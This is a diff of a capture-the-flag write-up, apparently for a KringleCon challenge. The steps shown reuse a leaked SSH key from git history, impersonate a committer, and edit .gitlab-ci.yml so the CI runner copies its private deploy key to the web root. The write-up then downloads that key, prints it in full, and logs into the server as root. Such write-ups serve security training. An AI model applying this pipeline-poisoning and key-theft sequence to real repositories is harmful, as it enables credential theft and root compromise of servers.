@@ -153,7 +153,7 @@ Let's make use of this SSH key
 
 ```bash
 grinchum-land:~/wordpress.flag.net.internal$ cp -r .ssh $HOME/
-grinchum-land:~/wordpress.flag.net.internal$ chmod 700 $HOME/.    
+grinchum-land:~/wordpress.flag.net.internal$ chmod 700 $HOME/    
 grinchum-land:~/wordpress.flag.net.internal$ chmod 700 $HOME/.ssh/
 grinchum-land:~/wordpress.flag.net.internal$ chmod 644 $HOME/.ssh/.deploy.pub 
 grinchum-land:~/wordpress.flag.net.internal$ chmod 600 $HOME/.ssh/.deploy
@@ -172,43 +172,7 @@ Host gitlab.flag.net.internal
 Cloning the repository using SSH instead of HTTP:
 
 ```bash
-
-```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
----- OLD SHIT
-
-Then updated .git/config to reflect the switch to SSH:
-
-```
-[core]
-        repositoryformatversion = 0
-        filemode = true
-        bare = false
-        logallrefupdates = true
-[remote "origin"]
-        # url = http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
-        url = git@gitlab.flag.net.internal:/rings-of-powder/wordpress.flag.net.internal.git
-        fetch = +refs/heads/*:refs/remotes/origin/*
-[branch "main"]
-        remote = origin
-        merge = refs/heads/main
+grinchum-land:~$ git clone git@gitlab.flag.net.internal:/rings-of-powder/wordpress.flag.net.internal.git
 ```
 
 Further impersonation, update the Git username and email settings (values grabbed from git log):
@@ -217,3 +181,80 @@ Further impersonation, update the Git username and email settings (values grabbe
 grinchum-land:~/wordpress.flag.net.internal$ git config --global user.name "knee-oh"
 grinchum-land:~/wordpress.flag.net.internal$ git config --global user.email "sporx@kringlecon.com"
 ```
+
+At this point it was tiresome to reproduce the steps above each time the terminal was reset, so I put my commands in a script to make things more efficient:
+
+```bash
+git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
+cd wordpress.flag.net.internal
+git checkout abdea0ebb21b156c01f7533cea3b895c26198c98
+cp -r .ssh $HOME/
+chmod 700 $HOME/    
+chmod 700 $HOME/.ssh/
+chmod 644 $HOME/.ssh/.deploy.pub 
+chmod 600 $HOME/.ssh/.deploy
+touch $HOME/.ssh/config
+echo -e "Host gitlab.flag.net.internal\n\tUser git\n\tHostname gitlab.flag.net.internal\n\tIdentityFile ~/.ssh/.deploy" >> $HOME/.ssh/config
+cd 
+mv wordpress.flag.net.internal wordpress.flag.net.internal.bak 
+git clone git@gitlab.flag.net.internal:/rings-of-powder/wordpress.flag.net.internal.git
+git config --global user.name "knee-oh"
+git config --global user.email "sporx@kringlecon.com"
+```
+
+Now, here's the meat. Inside the repositoriy there is a file .gitlab-ci.yml 
+
+```bash
+grinchum-land:~/wordpress.flag.net.internal$ cat .gitlab-ci.yml 
+stages:
+  - deploy
+
+deploy-job:      
+  stage: deploy 
+  environment: production
+  script:
+    - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/htm
+```
+
+This contains a command to run when deploying. If we look closer at it, it uses a SSH key (/etc/gitlab-runner/hhc22-wordpress-deploy). If we change the file to:
+
+```bash
+stages:
+  - deploy
+
+deploy-job:      
+  stage: deploy 
+  environment: production
+  script:
+    - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal:/var/www/htm
+```
+
+The SSH key will be rsynced over to the webserver when the deployment runs. So lets commit the file above and retrieve the SSH key:
+
+```bash
+grinchum-land:~/wordpress.flag.net.internal$ wget wordpress.flag.net.internal/hhc22-wordpress-deploy
+grinchum-land:~/wordpress.flag.net.internal$ cat hhc22-wordpress-deploy 
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACD8EYdZTOpf5REuWXMb9FKCFWoiIX2HoU1aH90V0Ptq3wAAAJiMXr0BjF69
+AQAAAAtzc2gtZWQyNTUxOQAAACD8EYdZTOpf5REuWXMb9FKCFWoiIX2HoU1aH90V0Ptq3w
+AAAEBtNE6sqOFoqkmOhcB/9DgzaQhQRC/bwkAbsBXwqrt/mPwRh1lM6l/lES5Zcxv0UoIV
+aiIhfYehTVof3RXQ+2rfAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
+-----END OPENSSH PRIVATE KEY-----
+grinchum-land:~/wordpress.flag.net.internal$
+```
+
+Success! Now ssh into the Wordpress server:
+
+```bash
+grinchum-land:~/wordpress.flag.net.internal$ chmod 600 hhc22-wordpress-deploy 
+grinchum-land:~/wordpress.flag.net.internal$ ssh root@wordpress.flag.net.internal -i hhc22-wordpress-deploy
+root@wordpress:~# ls /
+bin  boot  dev  etc  flag.txt  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+root@wordpress:~# cd /  
+root@wordpress:/# cat flag.txt
+```
+
+And the flag is: 
+
+![Elfen ring flag](/img/elfen-ring/elfen-ring-flag.png)
